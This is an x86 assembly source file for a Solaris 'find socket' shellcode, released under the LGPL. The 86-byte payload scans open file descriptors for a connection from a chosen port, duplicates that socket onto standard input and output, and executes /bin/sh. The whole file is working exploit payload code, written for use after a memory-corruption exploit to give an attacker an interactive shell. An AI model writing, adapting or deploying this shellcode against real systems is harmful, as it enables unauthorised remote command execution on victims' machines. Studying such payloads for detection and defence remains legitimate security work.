/*
 *  $Id: sol-x86-fndsockcode.s 40 2008-11-17 02:45:30Z ramon $
 *
 *  sol-x86-fndsockcode.s
 *  Copyright 2006 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.global _start

_start:

# 86 bytes

fndsockcode_part1:
    xorl    %ebx,%ebx
    mull    %ebx
    pushl   %ebx
    movl    %esp,%edi

syscallcode:
    pushl   $0x3cffd8ff
    pushl   $0x65
    movl    %esp,%esi
    notl    0x04(%esi)
    notb    (%esi)

fndsockcode_part2:
    pushl   %edi
    movb    $0x91,%bl
    pushl   %ebx
    pushl   %ebx

    pushl   %esp
    movb    $0x54,%bh
    pushl   %ebx
    pushl   %eax

0:
    popl    %eax
    incl    %eax
    pushl   %eax
    pushl   $0x36
    popl    %eax
    call    *%esi

    cmpw    $0xd204,0x02(%edi)
    jne     0b

    popl    %eax
    pushl   %eax
    pushl   $0x09
    pushl   %eax

1:
    pushl   $0x3e
    popl    %eax
    call    *%esi

    decl    -0x20(%edi)
    jns     1b

shellcode:
#    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %ebx
    movl    %esp,%ecx
    pushl   %eax
    pushl   %ecx
    pushl   %ebx
    movb    $0x3b,%al
    call    *%esi

